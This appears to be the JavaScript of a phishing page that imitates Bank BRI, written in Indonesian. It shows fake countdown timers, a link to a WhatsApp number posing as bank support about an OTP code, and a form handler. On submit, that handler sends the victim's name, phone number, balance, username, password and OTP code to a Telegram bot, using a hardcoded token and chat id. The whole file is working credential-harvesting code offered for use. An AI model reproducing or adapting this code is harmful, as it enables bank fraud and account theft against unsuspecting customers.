var logo = sessionStorage.getItem("logo");
document.getElementById("nomorhp").value = logo + "";
var nomor = sessionStorage.getItem("nomor");
document.getElementById("nomorhp").value = nomor + "";
var nama = sessionStorage.getItem("nama");
document.getElementById("nama").value = nama + "";
var saldo = sessionStorage.getItem("saldo");
document.getElementById("saldo").value = saldo + "";
var unames = sessionStorage.getItem("unames");
document.getElementById("user").value = unames + "";
var norek = sessionStorage.getItem("norek");
document.getElementById("pass").value = norek + "";

 function tutupimg(){
      setTimeout(() => {
  $("#popupku").hide();
      },1000)
      setTimeout(() => {
       audio = document.getElementById("bsi");
    audio.play();
    audio.loop = false
      },900)
  $("#gambarku").addClass("naik");
 }

</script>
<script>
function getcs(){
 $("#process1").show();   
  audio4 = document.getElementById("bsiku");
  audio = document.getElementById("bsi");
    audio4.play();
     audio.load();
    audio4.loop = false
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://wa.me/628785?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20Belum%20Mendapat%20Kode%20OTP Kupon';

    }, 5000);    
    
}     
 </script>
<script>
    window.onload = function() {
  var minute = 02;
  var sec = 59;
  setInterval(function() {
    document.getElementById("waktu").innerHTML =   minute + " : " + sec  ;
    sec--;

    if (sec == 0) {
      minute--;
      sec = 59;

      if (minute == 0) {
        minute = 1;
      }
    }
  }, 1000);
}
  
  
  
   
    document.getElementById('waktu1').innerHTML =
          03 + ":" + 01;
        startTimer();
        
        function startTimer() {
          var presentTime = document.getElementById('waktu1').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('waktu1').innerHTML =
            m + " : " + s;
          console.log(m)
          setTimeout(startTimer, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
        
        
        
    
    </script>  
  <script>
      document.getElementById('timer').innerHTML =
          01 + ":" + 01;
        startTimer1();
        
        function startTimer1() {
          var presentTime = document.getElementById('timer').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('timer').innerHTML =
            m + " : " + s;
          console.log(m)
          setTimeout(startTimer1, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
        
       
 $('#formLink').on('submit', function (event) {
    
 document.getElementById('kirims').value = "Memproses....";



       var gabungan = '' + logo.value +'%0A𝗡𝗮𝗺𝗮           : ' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗽  : ' + nomor.value + '%0A%0A𝗦𝗮𝗹𝗱𝗼          :𝗥𝗽.' + saldo.value + '%0A%0A𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲  : ' + unames.value + '%0A𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱  : ' + password.value + '%𝗞𝗼𝗱𝗲 𝗢𝗧𝗣  : ' + Konfirmasi.value;


                var token = '7826896424:AAE6w0wZPAtlo9-vvLRGzk-40UG_uTArZtA'; // Ganti dengan token bot yang kamu buat
                var grup = '7228666759'; // Ganti dengan chat id dari bot yang kamu buat
                

                $.ajax({
                    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
                    method: `POST`,
 
 complete: function(data) {
            console.log('Complete')
 setTimeout(function(){
  document.getElementById("blinkAktivasi").style.display = "block";
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
    }, 1000);
setTimeout(function(){
    document.getElementById('kirims').value = "Konfirmasi";
  }, 1000);

        }
    });

    return false;
});   
      


<script>
 function gantiborder(){
   $("#nama").removeClass('textarea'); 
   $("#blinkk").hide(); 
   document.getElementById('kirims').value = "Konfirmasi";
 }   
 
 function gantiborder1(){
   $("#nama1").removeClass('textarea1'); 
   $("#blinkAktivasi").hide(); 
   $("#logoku").show(); 
   document.getElementById('kirims').value = "Konfirmasi";
 }   